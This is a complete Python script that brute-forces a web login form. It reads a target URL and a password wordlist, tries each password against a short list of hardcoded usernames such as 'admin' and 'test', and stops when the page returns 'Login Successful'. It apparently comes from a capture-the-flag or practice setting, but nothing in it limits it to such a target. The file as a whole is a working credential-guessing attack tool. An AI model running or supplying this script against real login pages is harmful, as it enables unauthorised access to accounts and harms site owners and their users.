#!/usr/bin/python3
import requests
import sys

target = input("Provide Target URL: ")

usernames = ["admin", "user", "test", "mrrobot","yossef"]

passwords = input("Location path wordlist>> ")

magic_word = "Login Successful"

for username in usernames:
    with open(passwords, "r") as passwords_list:
        for password in passwords_list:
            password = password.strip("\n")
            sys.stdout.write(f"[x] Attempting user:password -> {username} : {password}\r")
            sys.stdout.flush()
            r = requests.post(target, data={"username": username, "password": password})
            if magic_word.strip() in r.text.strip():
                sys.stdout.write("\n")
                sys.stdout.write(f"\t[>>>>] Valid Password '{password}' found for user '{username}'!\n")
                sys.exit()

    sys.stdout.write("\n")
    sys.stdout.write(f"\tNo valid password found for user '{username}'. Moving to next user.\n")
    sys.stdout.flush()
